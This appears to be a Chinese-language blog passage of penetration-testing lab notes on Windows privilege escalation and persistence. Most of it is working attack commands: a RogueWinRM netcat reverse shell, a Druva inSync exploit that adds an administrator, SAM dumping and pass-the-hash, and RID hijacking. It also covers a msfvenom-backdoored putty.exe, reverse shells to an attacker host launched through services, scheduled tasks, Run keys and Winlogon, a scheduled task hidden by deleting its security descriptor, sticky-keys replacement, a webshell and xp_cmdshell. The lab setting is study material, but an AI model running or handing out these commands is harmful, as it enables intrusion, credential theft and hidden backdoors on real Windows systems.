<p>每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用 SYSTEM 权限自动创建到端口 5985 的连接。端口 5985 通常用于 WinRM 服务，该服务只是一个公开 Powershell 控制台的端口，可通过网络远程使用。可以将其视为SSH，但使用的是 Powershell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">使用方法</span><br><span class="line"></span><br><span class="line">Linux开启监听</span><br><span class="line"></span><br><span class="line">Windows执行工具</span><br><span class="line"></span><br><span class="line">- c:\tools\RogueWinRM\RogueWinRM.exe -p &quot;C:\tools\nc64.exe&quot; -a &quot;-e cmd.exe 10.9.0.87 4442&quot;net user</span><br><span class="line"></span><br><span class="line">弹回shell</span><br><span class="line"></span><br><span class="line">#### 未打补丁的安全包</span><br><span class="line"></span><br><span class="line">```shell-session</span><br><span class="line">wmic product get name,version,vendor</span><br><span class="line">#可能会需要一分钟，然后在 exploit-db、  packet storm 或普通的 Google等网站搜现有安装包漏洞</span><br></pre></td></tr></table></figure>

<h5 id="Druva-inSync-6-6-3"><a href="#Druva-inSync-6-6-3" class="headerlink" title="Druva inSync 6.6.3"></a>Druva inSync 6.6.3</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ErrorActionPreference = &quot;Stop&quot;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;net user pwnd2 SimplePass123 /add &amp; net localgroup administrators pwnd2 /add&quot;</span><br><span class="line"></span><br><span class="line">$s = New-Object System.Net.Sockets.Socket(</span><br><span class="line">    [System.Net.Sockets.AddressFamily]::InterNetwork,</span><br><span class="line">    [System.Net.Sockets.SocketType]::Stream,</span><br><span class="line">    [System.Net.Sockets.ProtocolType]::Tcp</span><br><span class="line">)</span><br><span class="line">$s.Connect(&quot;127.0.0.1&quot;, 6064)</span><br><span class="line"></span><br><span class="line">$header = [System.Text.Encoding]::UTF8.GetBytes(&quot;inSync PHC RPCW[v0002]&quot;)</span><br><span class="line">$rpcType = [System.Text.Encoding]::UTF8.GetBytes(&quot;$([char]0x0005)`0`0`0&quot;)</span><br><span class="line">$command = [System.Text.Encoding]::Unicode.GetBytes(&quot;C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd&quot;);</span><br><span class="line">$length = [System.BitConverter]::GetBytes($command.Length);</span><br><span class="line"></span><br><span class="line">$s.Send($header)</span><br><span class="line">$s.Send($rpcType)</span><br><span class="line">$s.Send($length)</span><br><span class="line">$s.Send($command)</span><br></pre></td></tr></table></figure>

<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="思路表"><a href="#思路表" class="headerlink" title="思路表"></a>思路表</h3><ol>
<li>为低等用户提高权限<ol>
<li>分到管理员组</li>
<li>添加到备份操作员组</li>
<li>特殊权限和安全描述<ul>
<li>对于备份操作员组，默认分配有两个权限，将新用户写入权限文件并投入使用</li>
</ul>
</li>
<li>RID劫持</li>
</ol>
</li>
<li>文件target修改<ol>
<li>改为ps1文件藏码，用powershell使用，换图标</li>
<li>将已有windows文件msf生成一个带码的</li>
<li>劫持关联文件<ul>
<li>写入注册表，里面指向ps1</li>
</ul>
</li>
</ol>
</li>
<li>后门服务<ol>
<li>新建服务</li>
<li>修改已有停用服务</li>
</ol>
</li>
<li>计划任务<ol>
<li>多少分钟执行一次<ol>
<li>删除SD去隐藏</li>
</ol>
</li>
</ol>
</li>
<li>开机自启<ol>
<li>写入自启动文件夹</li>
<li>写入run</li>
<li>Winlogon指向后边添加东西<ul>
<li>hell<code>和都</code>Userinit&#96;可以在现实世界场景中实现持久性</li>
</ul>
</li>
<li>写脚本<ul>
<li>userinit指向这个东西environment</li>
</ul>
</li>
</ol>
</li>
<li>登录屏幕&#x2F;rdp后门<ol>
<li>web界面码</li>
<li>数据库码</li>
<li>粘滞键</li>
<li>Utilman<ul>
<li>登陆界面的辅助小圈</li>
</ul>
</li>
</ol>
</li>
</ol>
<h3 id="分配群组成员资格"><a href="#分配群组成员资格" class="headerlink" title="分配群组成员资格"></a>分配群组成员资格</h3><h4 id="直接分到管理员权限组"><a href="#直接分到管理员权限组" class="headerlink" title="直接分到管理员权限组"></a>直接分到管理员权限组</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net localgroup administrators thmuser0 /add</span><br></pre></td></tr></table></figure>

<h4 id="添加到备份操作员组"><a href="#添加到备份操作员组" class="headerlink" title="添加到备份操作员组"></a>添加到备份操作员组</h4><p>（有读取&#x2F;写入 系统文件和注册表，忽略任何配置的DACL，可以去复制sam和system</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net localgroup &quot;Backup Operators&quot; thmuser1 /add</span><br></pre></td></tr></table></figure>

<p>但是没有远程桌面RDP或远程管理用户WinRM组，无法远程连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net localgroup &quot;Remote Management Users&quot; thmuser1 /add</span><br></pre></td></tr></table></figure>

<p>WinRM连接如下↓</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.44.235 -u thmuser1 -p Password321</span><br></pre></td></tr></table></figure>

<p>whoami &#x2F;groups出现以下提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only</span><br></pre></td></tr></table></figure>

<p>由于用户帐户控制 ( UAC ) 造成的。UAC实现 的功能之一LocalAccountTokenFilterPolicy会在远程登录时剥夺任何本地帐户的管理权限。虽然您可以通过 UAC 从图形用户会话提升您的权限（在此处阅读有关 UAC的更多信息），但如果您使用的是 WinRM，您将被限制在有限的访问令牌中，没有管理权限。</p>
<p>修改注册表禁用LocalAccountTokenFilterPolicy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1</span><br></pre></td></tr></table></figure>

<p>WinRM远连接，然后下载sam和system，特别慢,用kali特别慢，换成他提供的攻击机，然后共享文件夹传输失败</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system system.bak</span><br><span class="line">reg save hklm\sam sam.bak</span><br><span class="line">download system.bak</span><br><span class="line">download sam.bak</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fortra/impacket/blob/master/examples/secretsdump.py</span><br></pre></td></tr></table></figure>

<p>用脚本解密，kali环境不能跑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL</span><br></pre></td></tr></table></figure>

<p>传递hash函数攻击受害机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.44.235 -u Administrator -H f3118544a831e728781d780cfdb9c1fa</span><br></pre></td></tr></table></figure>

<h5 id="用hash桌面连接"><a href="#用hash桌面连接" class="headerlink" title="用hash桌面连接"></a>用hash桌面连接</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.44.235 /u:Administrator /pth:f3118544a831e728781d780cfdb9c1fa</span><br></pre></td></tr></table></figure>

<h5 id="被阻止，不让登录"><a href="#被阻止，不让登录" class="headerlink" title="被阻止，不让登录"></a>被阻止，不让登录</h5><p>报错如下，密码为空，写个密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Account restrictions are preventing this user from signing in. For example: blank</span><br><span class="line">passwords aren&#x27;t allowed, sign-in times are limited, or a policy restriction has been</span><br><span class="line">enforced.</span><br></pre></td></tr></table></figure>

<ul>
<li>查看锁定状态</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-LocalUser -Name &quot;username&quot; | Select-Object Name,Enabled</span><br></pre></td></tr></table></figure>

<p>被锁的话打开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-LocalUser -Name &quot;username&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果账户密码为空，设置密码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-LocalUser -Name &quot;Administrator&quot; -Password (ConvertTo-SecureString &quot;NewPassword123&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>

<h3 id="特殊权限和安全描述"><a href="#特殊权限和安全描述" class="headerlink" title="特殊权限和安全描述"></a>特殊权限和安全描述</h3><p>对于备份操作员组，其<strong>默认分配有以下两个权限</strong>：</p>
<p>SeBackupPrivilege：用户可以读取系统中的任何文件，忽略任何现有的DACL 。<br>SeRestorePrivilege：用户可以写入系统中的任何文件，忽略任何现有的DACL 。</p>
<p>将当前配置文件导出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secedit /export /cfg config.inf</span><br></pre></td></tr></table></figure>

<p>我们打开文件并将我们的用户添加到有关 SeBackupPrivilege 和 SeRestorePrivilege 的配置行中：</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250109112427184.png?raw=true" alt="image-20250109112427184"></p>
<p>将.inf文件著那位.sdb文件，用该文件配置加载回系统</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secedit /import /cfg config.inf /db config.sdb</span><br><span class="line"></span><br><span class="line">secedit /configure /db config.sdb /cfg config.inf</span><br></pre></td></tr></table></figure>

<p>打开WinRM配置窗口，为其分配 WinRM 的全部权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI</span><br></pre></td></tr></table></figure>

<p>下边这个图片是初始的，要先为其add个用户，然后+全部控制权限</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250109113946882.png?raw=true" alt="image-20250109113946882"></p>
<p>请注意，要使该用户充分使用给定的权限，您必须更改<strong>LocalAccountTokenFilterPolicy</strong>注册表项,前面说了，看前面</p>
<p>显示报错就退出重新进去以下</p>
<h3 id="RID劫持"><a href="#RID劫持" class="headerlink" title="RID劫持"></a>RID劫持</h3><p>创建用户时，会为其分配一个称为**相对 ID (RID)**的标识符。RID 只是一个代表整个系统中用户的数字标识符。当用户登录时，LSASS 进程从 SAM 注册表配置单元获取其 RID，并创建与该 RID 关联的访问令牌。如果我们可以篡改注册表值，我们就可以让 Windows 通过将相同的 RID 关联到两个帐户来为非特权用户分配管理员访问令牌。</p>
<p>在任何 Windows 系统中，默认管理员帐户都被分配了<strong>RID &#x3D; 500</strong>，而普通用户的<strong>RID 通常为 &gt;&#x3D; 1000</strong>。</p>
<h4 id="查看用户RID"><a href="#查看用户RID" class="headerlink" title="查看用户RID"></a>查看用户RID</h4><ul>
<li>wmic useraccount get name,sid</li>
</ul>
<p>RID 是 SID 的最后一位（1010 表示 thmuser3，500 表示管理员）。SID 是一个标识符，它允许操作系统跨域识别用户</p>
<p>编写注册表，需要system权限，administrator都不行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\tools\pstools&gt; PsExec64.exe -i -s regedit</span><br></pre></td></tr></table></figure>

<p>从 Regedit 中，我们将转到<code>HKLM\SAM\SAM\Domains\Account\Users\</code>计算机中每个用户对应的键。由于我们要修改 thmuser3，因此我们需要搜索一个键，其 RID 为十六进制 (1010 &#x3D; 0x3F2)。在相应的键下，将有一个名为<strong>F</strong>的值，它在位置 0x30 处保存用户的有效 RID：</p>
<p>F2 03 (1010)改为 F4 01 (500)</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250109123031363.png?raw=true" alt="image-20250109123031363"></p>
<p>登不进去就加入远程管理组</p>
<p>再进不去直接去拿flag，能拿到</p>
<h3 id="后门文件"><a href="#后门文件" class="headerlink" title="后门文件"></a>后门文件</h3><h4 id="可执行文件puttyX-exe"><a href="#可执行文件puttyX-exe" class="headerlink" title="可执行文件puttyX.exe"></a>可执行文件puttyX.exe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b &quot;\x00&quot; -f exe -o puttyX.exe</span><br></pre></td></tr></table></figure>

<h4 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h4><p>命名为ps1文件，powershell脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Start-Process -NoNewWindow &quot;c:\tools\nc64.exe&quot; &quot;-e cmd.exe 10.9.0.87 4445&quot;</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\calc.exe</span><br></pre></td></tr></table></figure>

<p>将clac的target修改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1</span><br></pre></td></tr></table></figure>

<p>kali监听就行</p>
<h4 id="劫持关联文件"><a href="#劫持关联文件" class="headerlink" title="劫持关联文件"></a>劫持关联文件</h4><p>位于注册表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\Software\Classes\ </span><br></pre></td></tr></table></figure>

<p>直接检查子<code>.txt</code>键并找到与其关联的<strong>程序 ID (ProgID)</strong> 。ProgID 只是系统上安装的程序的标识符。对于 .txt 文件，我们将获得以下 ProgID：</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250109133712780.png?raw=true" alt="image-20250109133712780"></p>
<p>然后会出现，下边第一个选错了,整第二个去</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250109134030114.png?raw=true" alt="image-20250109134030114"></p>
<p>或者</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250109134046585.png?raw=true" alt="image-20250109134046585"></p>
<h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><p>写个2.ps1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Start-Process -NoNewWindow &quot;c:\tools\nc64.exe&quot; &quot;-e cmd.exe ATTACKER_IP 4448&quot;</span><br><span class="line">C:\Windows\system32\NOTEPAD.EXE $args[0]</span><br></pre></td></tr></table></figure>

<p>注册表里面改成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -WindowStyle hidden C:\flags\2.ps1 %1</span><br></pre></td></tr></table></figure>

<p>当你尝试打开 .txt 文件时，系统将执行<code>%SystemRoot%\system32\NOTEPAD.EXE %1</code>，其中<code>%1</code>代表打开的文件的名称。</p>
<p>创建一个具有以上内容的 ps1 脚本并将其保存到<code>C:\Windows\backdoor2.ps1</code></p>
<h3 id="后门服务"><a href="#后门服务" class="headerlink" title="后门服务"></a>后门服务</h3><h4 id="创建新服务"><a href="#创建新服务" class="headerlink" title="创建新服务"></a>创建新服务</h4><p>重置管理员密码自启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe create THMservice binPath= &quot;net user Administrator Passwd123&quot; start= auto</span><br><span class="line">sc.exe start THMservice</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>每个等号后面必须有一个空格才能使命令起作用。</p>
<p>msf生成个码，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe</span><br></pre></td></tr></table></figure>

<p>将服务改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe create THMservice2 binPath= &quot;C:\windows\rev-svc.exe&quot; start= auto</span><br><span class="line">sc.exe start THMservice2</span><br></pre></td></tr></table></figure>

<p>下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.9.0.87:8080/rs.exe -O rs.exe</span><br></pre></td></tr></table></figure>

<p>,开始服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe create THMservice2 binPath= &quot;C:\flags\rs.exe&quot; start= auto</span><br></pre></td></tr></table></figure>

<h4 id="修改现有服务"><a href="#修改现有服务" class="headerlink" title="修改现有服务"></a>修改现有服务</h4><p>但蓝队可能会监控整个网络的新服务创建。我们可能希望重用现有服务，而不是创建一个服务以避免被发现。通常，任何禁用的服务都是不错的选择，因为它可以在用户不知情的情况下被更改。</p>
<p>获取可用服务列表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe query state=all</span><br></pre></td></tr></table></figure>

<p>名为 THMService3 的已停止服务。要查询该服务的配置，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe qc THMService3</span><br></pre></td></tr></table></figure>

<p>生成码，然后修改配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config THMservice3 binPath= &quot;C:\flags\rs.exe&quot; start= auto obj= &quot;LocalSystem&quot;</span><br></pre></td></tr></table></figure>

<h3 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h3><h4 id="任务计划程序"><a href="#任务计划程序" class="headerlink" title="任务计划程序"></a>任务计划程序</h4><p>每分钟运行一次反向 shell 的任务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr &quot;c:\tools\nc64 -e cmd.exe 10.9.0.87 4446&quot; /ru SYSTEM</span><br></pre></td></tr></table></figure>

<p><code>/sc</code>和<code>/mo</code>选项表示该任务应每分钟运行一次。<code>/ru</code>选项表示该任务将以 SYSTEM 权限运行。</p>
<p>检查任务是否创建完成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /tn thm-taskbackdoor</span><br></pre></td></tr></table></figure>

<p>kali监听</p>
<h4 id="让任务不可见"><a href="#让任务不可见" class="headerlink" title="让任务不可见"></a>让任务不可见</h4><p><strong>安全描述符 (SD)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">所有计划任务的安全描述符都存储在 中HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\。您将为每个任务找到一个注册表项，该项下名为“SD”的值包含安全描述符。只有拥有 SYSTEM 权限才能删除该值。</span><br></pre></td></tr></table></figure>

<p>让psexec以system权限开计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\tools\pstools\PsExec64.exe -s -i regedit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\THM-TaskBackdoor  安全标识符删掉</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250109143254803.png?raw=true" alt="image-20250109143254803"></p>
<p>再次查找服务就会找不到，但是反弹的shell仍然能接收到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /tn thm-taskbackdoor</span><br></pre></td></tr></table></figure>

<h3 id="登录触发持久型"><a href="#登录触发持久型" class="headerlink" title="登录触发持久型"></a>登录触发持久型</h3><h4 id="启动文件夹"><a href="#启动文件夹" class="headerlink" title="启动文件夹"></a>启动文件夹</h4><p>生成码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.9.0.87:8080/exe4450.exe -O exe4450.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy exe4450.exe &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\&quot;</span><br></pre></td></tr></table></figure>

<p>登出去，重新远程连接，弹回shell</p>
<h4 id="写入注册表run"><a href="#写入注册表run" class="headerlink" title="写入注册表run"></a>写入注册表run</h4><p>类型REG_EXPAND_sz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>

<p>您还可以通过注册表强制用户在登录时执行程序。您可以使用以下注册表项来指定登录时要运行的应用程序，而不是将有效负载传递到特定目录中：</p>
<ul>
<li>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</li>
<li>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</li>
<li>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</li>
<li>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</li>
</ul>
<p>下的注册表项<code>HKCU</code>仅适用于当前用户，下的注册表项<code>HKLM</code>适用于所有人。<code>Run</code>键下指定的任何程序将在用户每次登录时运行。<code>RunOnce</code>键下指定的程序只会执行一次。</p>
<h4 id="Winlogon操作系统"><a href="#Winlogon操作系统" class="headerlink" title="Winlogon操作系统"></a>Winlogon操作系统</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Computer\HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</span><br></pre></td></tr></table></figure>

<p>Userinit指向userinit.exe，它负责恢复您的用户配置文件偏好设置。<br>shell指向系统的shell，通常是explorer.exe。</p>
<p><code>shell</code>和都<code>Userinit</code>可以在现实世界场景中实现持久性，</p>
<p>这里使用Userinit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">,后面加上C:\Windows\exe4450.exe</span><br></pre></td></tr></table></figure>

<h4 id="登录脚本"><a href="#登录脚本" class="headerlink" title="登录脚本"></a>登录脚本</h4><p><strong>注意：仅适用于当前用户</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Environment</span><br></pre></td></tr></table></figure>

<p>要为用户创建环境变量，您可以转到<code>HKCU\Environment</code>注册表中。我们将使用该<code>UserInitMprLogonScript</code>条目指向我们的有效负载，以便在用户登录时加载它：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">放入码的地址就ok了</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add hkcu\Environment /t REG_EXPAND_SZ /v UserInitMprLogonScript /d C:\Windows\exe4450.exe</span><br></pre></td></tr></table></figure>

<h3 id="登录屏幕-rdp后门"><a href="#登录屏幕-rdp后门" class="headerlink" title="登录屏幕&#x2F;rdp后门"></a>登录屏幕&#x2F;rdp后门</h3><h5 id="粘滞键"><a href="#粘滞键" class="headerlink" title="粘滞键"></a>粘滞键</h5><p>按<code>SHIFT</code>5 次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">takeown /f c:\Windows\System32\sethc.exe</span><br><span class="line"></span><br><span class="line">icacls C:\Windows\System32\sethc.exe /grant Administrator:F</span><br><span class="line"></span><br><span class="line">copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe</span><br></pre></td></tr></table></figure>

<h5 id="Utilman"><a href="#Utilman" class="headerlink" title="Utilman"></a>Utilman</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">takeown /f c:\Windows\System32\utilman.exe</span><br><span class="line"></span><br><span class="line">icacls C:\Windows\System32\utilman.exe /grant Administrator:F</span><br><span class="line"></span><br><span class="line">copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</span><br></pre></td></tr></table></figure>

<h4 id="web后门"><a href="#web后门" class="headerlink" title="web后门"></a>web后门</h4><p>aspx码连接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move shell.aspx C:\inetpub\wwwroot\</span><br><span class="line">icacls shell.aspx /grant Everyone:F</span><br></pre></td></tr></table></figure>

<h4 id="mysql留码"><a href="#mysql留码" class="headerlink" title="mysql留码"></a>mysql留码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启用xp_cmdshell存储过程。xp_cmdshell是任何 MSSQL 安装中默认提供的存储过程，允许您直接在系统的控制台中运行命令，但默认情况下处于禁用状态。</span><br></pre></td></tr></table></figure>

<p>开放xp_cmdshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;Show Advanced Options&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">sp_configure &#x27;xp_cmdshell&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p>我们必须确保任何访问数据库的网站都可以运行<code>xp_cmdshell</code>。默认情况下，只有具有<code>sysadmin</code>角色的数据库用户才能执行此操作。由于预计 Web 应用程序将使用受限数据库用户，因此可以向所有用户授予权限以模拟该<code>sa</code>用户，即默认数据库管理员</p>
